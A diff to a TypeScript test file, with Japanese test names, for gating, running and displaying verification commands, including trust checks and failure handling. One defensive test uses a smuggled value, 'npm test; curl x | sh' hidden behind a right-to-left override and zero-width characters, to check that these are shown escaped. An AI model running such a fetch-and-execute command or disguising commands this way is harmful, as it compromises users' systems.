@@ -6,6 +6,7 @@ import type { Logger } from '../../src/log';
 import {
   describeFailure,
   executeVerifyCommands,
+  formatVerifyCommandForDisplay,
   gateVerifyCommands,
   listVerifyCommands,
   type VerifyCommandConsent,
@@ -143,6 +144,18 @@ describe('gateVerifyCommands', () => {
     expect(confirm).toHaveBeenCalledTimes(2);
   });
 
+  it('確認を待つ間にTrustが外されたら実行しない', async () => {
+    let trusted = true;
+    const input = base({
+      confirm: async () => {
+        trusted = false;
+        return true;
+      },
+    });
+    input.deps.isWorkspaceTrusted = () => trusted;
+    expect(await gateVerifyCommands(input)).toBe('untrusted');
+  });
+
   it('確認待ちの間に中断されたら実行しない', async () => {
     const controller = new AbortController();
     const pending = gateVerifyCommands(
@@ -229,7 +242,11 @@ describe('executeVerifyCommands', () => {
     expect(outcome.failures[0]).toContain('lint error at a.ts');
     expect(run).toHaveBeenCalledTimes(2);
     const records = await store.list();
-    expect(records.map((r) => r.outcome)).toEqual(['fail', 'pass']);
+    // 同じミリ秒に保存した記録の並びはidで決まるので、コマンドで引き当てる
+    expect(Object.fromEntries(records.map((r) => [r.command, r.outcome]))).toEqual({
+      'npm run lint': 'fail',
+      'npm test': 'pass',
+    });
   });
 
   it('時間切れは失敗にし、exit codeの無い記録を残す', async () => {
@@ -265,6 +282,20 @@ describe('executeVerifyCommands', () => {
     expect(await store.list()).toEqual([]);
   });
 
+  it('起動が例外で終わっても失敗として扱い、残りのコマンドも実行する', async () => {
+    const run = vi
+      .fn<NonNullable<WorkflowVerifyCommandDeps['run']>>()
+      .mockImplementationOnce(() => {
+        throw new Error('invalid argument');
+      })
+      .mockResolvedValueOnce(result());
+    const outcome = await execute(['npm run lint', 'npm test'], deps(run));
+    expect(outcome.failures).toEqual([
+      '検証コマンドを実行できませんでした（invalid argument）: npm run lint',
+    ]);
+    expect(run).toHaveBeenCalledTimes(2);
+  });
+
   it('記録を保存できなくても、判定はexit codeから行う', async () => {
     const logger = log();
     const failing: WorkflowVerifyCommandDeps = {
@@ -274,6 +305,16 @@ describe('executeVerifyCommands', () => {
     const outcome = await execute(['npm test'], failing, undefined, logger);
     expect(outcome.failures).toHaveLength(1);
     expect(logger.warn).toHaveBeenCalledWith(expect.stringContaining('disk full'));
+  });
+});
+
+describe('formatVerifyCommandForDisplay', () => {
+  it('改行・双方向制御文字・ゼロ幅文字・行区切りを除去せずエスケープして見せる', () => {
+    const line = formatVerifyCommandForDisplay({
+      taskId: 't1',
+      command: 'npm test‮; curl x | sh​\n ',
+    });
+    expect(line).toBe('["t1"] "npm test\\u{202E}; curl x | sh\\u{200B}\\n\\u{2028}"');
   });
 });
 
